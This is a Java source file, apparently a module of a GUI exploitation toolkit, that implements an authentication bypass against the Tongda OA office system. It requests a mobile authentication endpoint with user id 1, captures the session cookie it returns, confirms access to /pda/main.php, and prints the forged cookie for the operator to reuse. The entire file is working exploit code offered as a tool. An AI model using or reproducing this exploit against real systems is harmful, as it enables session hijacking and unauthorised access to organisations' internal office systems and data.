package exp.oa.tongdaoa;

import com.github.kevinsawicki.http.HttpRequest;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;

import java.util.HashMap;

public class tongda_Authmobi_getCookie implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(()-> {
            textArea.appendText("\n 未授权访问需替换cookie");
            textArea.appendText("\n ");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        String path="/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0";
        HttpTools.get(url+path,new HashMap<>(),"utf-8");
        HttpRequest cookieRequest = HttpRequest.get(url + path)
                .trustAllCerts()
                .trustAllHosts();
        if (cookieRequest.body().isEmpty()) {
            String cookie=cookieRequest.header("Set-cookie");
            HashMap head = new HashMap();
            head.put("Cookie",cookie);
            if(!HttpTools.get(url+"/pda/main.php",head,"utf-8").getText().contains("未登录")){
                Platform.runLater(()-> {
                    textArea.appendText("\n [ tongda_Authmobi_getCookie ]");
                    textArea.appendText("\n 在线用户Cookie伪造成功，,替换cookie利用");
                    textArea_cmd.appendText("\n url: "+url+"/pda/main.php");
                    textArea_cmd.appendText("\n Cookie: "+cookie);
                    textArea.appendText("\n ");
                });
                return true;
            }
        }else {
            Platform.runLater(()-> {
                textArea.appendText("\n 登录认证绕过失败");
//                textArea_cmd.appendText("\n Cookie: "+cookie);
                textArea.appendText("\n ");
            });
            return false;
        }
        return false;
    }
}
